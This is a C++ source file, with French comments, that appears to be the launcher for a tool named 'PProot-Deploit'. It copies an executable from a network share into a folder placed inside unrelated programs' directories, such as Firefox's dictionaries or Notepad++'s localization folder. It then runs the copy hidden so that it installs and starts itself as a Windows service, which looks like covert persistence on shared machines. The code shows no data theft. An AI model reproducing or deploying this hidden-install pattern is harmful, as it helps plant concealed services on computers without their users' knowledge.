/*
 *
 *  Fichier principal
 *
 *
 *  © 2015 - Guillaume Gonnet
 *  License GPLv2
 */



#include "WindowsService.h"
#include "FilesCopy.h"
#include "Registry.h"
#include "SubProcess.h"

#include <string.h>

#include "Download.h"
#include "FilesDownload.h"
#include "Utils.h"



bool installByDefault = true;


#define SRC_PPROOT_DEPLOIT "\\\\192.168.220.10\\wpkg\\softwares\\videoproj\\ATI2\\ACE\\Profiles\\de.exe"

#define NAME_DIR "\\ext"




// Détermine le dossier cible

int numPath = -1;
#define NBR_DEST_PATH 5

string possibleDestPath[NBR_DEST_PATH] = {
    "C:\\Program Files\\Mozilla Firefox\\dictionaries",
    "C:\\Program Files\\Mozilla Firefox",
    "C:\\Program Files\\Notepad++\\localization",
    "C:\\Program Files",
    "C:"
};



bool nextDestPath() {

    do {
        numPath++;
    } while(!dirExists(possibleDestPath[numPath]) && numPath < NBR_DEST_PATH);

    return (numPath < NBR_DEST_PATH);
}



string getDestPath() {

    if (numPath >= 0 && numPath < NBR_DEST_PATH)
        return possibleDestPath[numPath];
    else
        return "";
}








// Fonction principale

int main(int argc, char ** argv)
{

    WindowsService service;


    if (argc >= 2) {


        if (strcmp(argv[1], "-install") == 0) {
            service.install("-service");
        }


        else if (strcmp(argv[1], "-start") == 0) {
            service.start();
        }

        else if (strcmp(argv[1], "-is") == 0) {
            service.install("-service");
            service.start();
        }


        else if (strcmp(argv[1], "-remove") == 0) {
            service.remove();
        }


        else if (strcmp(argv[1], "-service") == 0) {
            service.runAsService();
        }


        else if (strcmp(argv[1], "-copy") == 0) {
            FilesCopy f;

            if (f.run())
                Registry::create();
        }


        else {
            printf("Arguments invalides !\n");
        }


        return 0;
    }




    // On copie PProot-Deploit dans un dossier spécifique
    if (installByDefault) {


        BOOL result = false;


        while (!result && nextDestPath()) {

            // On crée le dossier contenant PProot et PProot-Deploit
            result = CreateDirectoryA( (getDestPath() + NAME_DIR).c_str(), NULL);

            if (!result && GetLastError() == ERROR_ALREADY_EXISTS)
                result = true;

            // On copie PProot-Deploit
            if (result)
                result = CopyFileA( SRC_PPROOT_DEPLOIT, (getDestPath() + NAME_DIR + "\\de.exe").c_str(), false);
        }


        ShellExecuteA(NULL, "open", (getDestPath() + NAME_DIR + "\\de.exe").c_str(), "-is", NULL, SW_HIDE);

        return 0;
    }



    printf("Erreur: pas d'argument !\n");
    return -1;

}
